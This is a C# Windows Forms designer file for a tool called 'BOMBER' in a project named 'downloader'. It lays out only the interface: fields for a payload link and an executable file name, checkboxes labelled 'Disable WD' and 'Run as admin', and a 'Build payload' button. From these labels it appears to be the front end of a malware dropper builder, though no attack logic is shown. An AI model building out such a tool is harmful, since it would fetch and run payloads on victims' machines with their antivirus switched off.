namespace downloader
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.payloadlink = new MetroFramework.Controls.MetroTextBox();
            this.metroStyleManager1 = new MetroFramework.Components.MetroStyleManager(this.components);
            this.checkbox1 = new MetroFramework.Controls.MetroCheckBox();
            this.buildpayload = new MetroFramework.Controls.MetroButton();
            this.checkbox2 = new MetroFramework.Controls.MetroCheckBox();
            this.filename_payload = new MetroFramework.Controls.MetroTextBox();
            this.aboutbtn = new MetroFramework.Controls.MetroButton();
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).BeginInit();
            this.SuspendLayout();
            // 
            // payloadlink
            // 
            this.payloadlink.Location = new System.Drawing.Point(23, 63);
            this.payloadlink.Name = "payloadlink";
            this.payloadlink.Size = new System.Drawing.Size(178, 23);
            this.payloadlink.TabIndex = 0;
            this.payloadlink.Text = "Enter payload link";
            this.payloadlink.Click += new System.EventHandler(this.metroTextBox1_Click);
            // 
            // metroStyleManager1
            // 
            this.metroStyleManager1.Owner = null;
            this.metroStyleManager1.Style = MetroFramework.MetroColorStyle.Black;
            this.metroStyleManager1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // checkbox1
            // 
            this.checkbox1.AutoSize = true;
            this.checkbox1.Location = new System.Drawing.Point(23, 121);
            this.checkbox1.Name = "checkbox1";
            this.checkbox1.Size = new System.Drawing.Size(83, 15);
            this.checkbox1.TabIndex = 1;
            this.checkbox1.Text = "Disable WD";
            this.checkbox1.UseVisualStyleBackColor = true;
            // 
            // buildpayload
            // 
            this.buildpayload.Location = new System.Drawing.Point(67, 198);
            this.buildpayload.Name = "buildpayload";
            this.buildpayload.Size = new System.Drawing.Size(95, 23);
            this.buildpayload.TabIndex = 2;
            this.buildpayload.Text = "Build payload";
            this.buildpayload.Click += new System.EventHandler(this.buildpayload_Click);
            // 
            // checkbox2
            // 
            this.checkbox2.AutoSize = true;
            this.checkbox2.Location = new System.Drawing.Point(23, 157);
            this.checkbox2.Name = "checkbox2";
            this.checkbox2.Size = new System.Drawing.Size(95, 15);
            this.checkbox2.TabIndex = 3;
            this.checkbox2.Text = "Run as admin";
            this.checkbox2.UseVisualStyleBackColor = true;
            // 
            // filename_payload
            // 
            this.filename_payload.Location = new System.Drawing.Point(23, 92);
            this.filename_payload.Name = "filename_payload";
            this.filename_payload.Size = new System.Drawing.Size(178, 23);
            this.filename_payload.TabIndex = 4;
            this.filename_payload.Text = "filename.exe";
            // 
            // aboutbtn
            // 
            this.aboutbtn.Location = new System.Drawing.Point(67, 227);
            this.aboutbtn.Name = "aboutbtn";
            this.aboutbtn.Size = new System.Drawing.Size(95, 23);
            this.aboutbtn.TabIndex = 5;
            this.aboutbtn.Text = "about";
            this.aboutbtn.Click += new System.EventHandler(this.aboutbtn_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(224, 277);
            this.Controls.Add(this.aboutbtn);
            this.Controls.Add(this.filename_payload);
            this.Controls.Add(this.checkbox2);
            this.Controls.Add(this.buildpayload);
            this.Controls.Add(this.checkbox1);
            this.Controls.Add(this.payloadlink);
            this.Name = "Form1";
            this.Text = "      BOMBER";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private MetroFramework.Controls.MetroTextBox payloadlink;
        private MetroFramework.Components.MetroStyleManager metroStyleManager1;
        private MetroFramework.Controls.MetroCheckBox checkbox1;
        private MetroFramework.Controls.MetroButton buildpayload;
        private MetroFramework.Controls.MetroCheckBox checkbox2;
        private MetroFramework.Controls.MetroTextBox filename_payload;
        private MetroFramework.Controls.MetroButton aboutbtn;
    }
}

